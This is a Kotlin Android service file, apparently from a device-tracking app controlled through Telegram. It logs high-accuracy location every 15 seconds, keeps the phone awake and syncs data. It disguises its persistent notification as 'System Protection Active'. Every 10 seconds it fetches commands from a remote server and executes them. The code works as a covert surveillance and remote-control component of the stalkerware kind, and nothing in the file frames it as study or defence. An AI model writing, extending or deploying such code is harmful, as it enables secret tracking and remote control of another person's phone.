package com.abuzahra.tracker.services

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.abuzahra.tracker.LocalStorageManager
import com.abuzahra.tracker.SharedPrefsManager
import com.abuzahra.tracker.TelegramDirectClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * MainTrackerService - الخدمة الرئيسية لتتبع الجهاز (الإصدار المباشر لتيليجرام)
 *
 * المعمارية الجديدة:
 * 1. تتبع الموقع الجغرافي وحفظه محلياً + إرساله مباشرة لتيليجرام
 * 2. مراقبة مستوى البطارية
 * 3. تشغيل استطلاع الأوامر من تيليجرام
 * 4. تشغيل DataSyncWorker بشكل دوري
 *
 * بدون سيرفر وسيط - التطبيق ←→ تيليجرام مباشرة
 */
class MainTrackerService : Service() {

    companion object {
        private const val TAG = "MainTrackerService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "tracker_channel"
        private const val WAKE_LOCK_TIMEOUT = 10 * 60 * 1000L // 10 دقائق
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var wakeLock: PowerManager.WakeLock? = null
    private lateinit var locationCallback: LocationCallback

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "تم إنشاء الخدمة الرئيسية (مباشر تيليجرام)")
        startForegroundServiceNotification()
        acquireWakeLock()
        startLocationUpdates()
        startBatteryMonitor()
        startServerCommandPolling()
    }

    // ==================== ==================== ====================
    //              إشعار الخدمة (Foreground Notification)
    // ==================== ==================== ====================

    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Protection Active")
            .setContentText("Connected to Telegram directly")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    // ==================== ==================== ====================
    //              تتبع الموقع الجغرافي (Location Tracking)
    // ==================== ==================== ====================

    @SuppressLint("MissingPermission")
    private fun startLocationUpdates() {
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 15000).build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { location ->
                    updateLocation(location)
                }
            }
        }

        LocationServices.getFusedLocationProviderClient(this)
            .requestLocationUpdates(locationRequest, locationCallback, mainLooper)
    }

    /**
     * تحديث الموقع - يحفظ محلياً فقط (لا يرسل تلقائياً لتجنب الإزعاج)
     * المدير يطلب الموقع عبر /location
     */
    private fun updateLocation(location: Location) {
        val locationData = mapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy.toDouble(),
            "speed" to location.speed.toDouble(),
            "altitude" to location.altitude.toDouble(),
            "timestamp" to location.time,
            "date_readable" to java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
                .format(java.util.Date(location.time)),
            "provider" to (location.provider ?: "unknown"),
            "collected_at" to System.currentTimeMillis()
        )

        // حفظ الموقع محلياً فقط
        LocalStorageManager.storeData(this, "location", locationData)
        Log.d(TAG, "تم حفظ الموقع محلياً: ${location.latitude}, ${location.longitude}")
    }

    // ==================== ==================== ====================
    //              مراقبة البطارية (Battery Monitor)
    // ==================== ==================== ====================

    private fun startBatteryMonitor() {
        serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
                    val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

                    SharedPrefsManager.setLastHeartbeat(this@MainTrackerService, System.currentTimeMillis())
                    Log.d(TAG, "مراقبة البطارية: $batteryLevel%")

                    // تشغيل مزامنة البيانات
                    DataSyncWorker.startImmediate(this@MainTrackerService)

                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في مراقبة البطارية: ${e.message}")
                }

                // انتظار 60 ثانية قبل الجولة التالية
                delay(60000)
            }
        }
    }

    // ==================== ==================== ====================
    //         استقبال الأوامر من السيرفر (بدون getUpdates)
    // ==================== ==================== ====================

    private fun startServerCommandPolling() {
        serviceScope.launch(Dispatchers.IO) {
            Log.d(TAG, "بدء استطلاع الأوامر من السيرفر (بدون getUpdates)...")
            while (isActive) {
                try {
                    val deviceId = SharedPrefsManager.getDeviceId(this@MainTrackerService)
                    if (deviceId != null) {
                        val commands = BotServerClient.getPendingCommands(deviceId)
                        if (commands.isNotEmpty()) {
                            Log.d(TAG, "تم استلام ${commands.size} أوامر من السيرفر")
                            for (cmd in commands) {
                                try {
                                    CommandExecutor.execute(this@MainTrackerService, cmd.command, cmd.params)
                                } catch (e: Exception) {
                                    Log.e(TAG, "خطأ في تنفيذ الأمر ${cmd.command}: ${e.message}")
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في استطلاع السيرفر: ${e.message}")
                }
                delay(10_000) // فحص كل 10 ثوان
            }
        }
    }

    // ==================== ==================== ====================
    //              إدارة الطاقة (Power Management)
    // ==================== ==================== ====================

    private fun acquireWakeLock() {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildApp::TrackerWakeLock")
        wakeLock?.acquire(WAKE_LOCK_TIMEOUT)
    }

    override fun onDestroy() {
        Log.d(TAG, "تم تدمير الخدمة الرئيسية")
        try {
            LocationServices.getFusedLocationProviderClient(this)
                .removeLocationUpdates(locationCallback)
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إيقاف تحديث الموقع: ${e.message}")
        }
        // TelegramDirectClient.stopCommandPolling() - لا حاجة، getUpdates معطّل
        wakeLock?.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
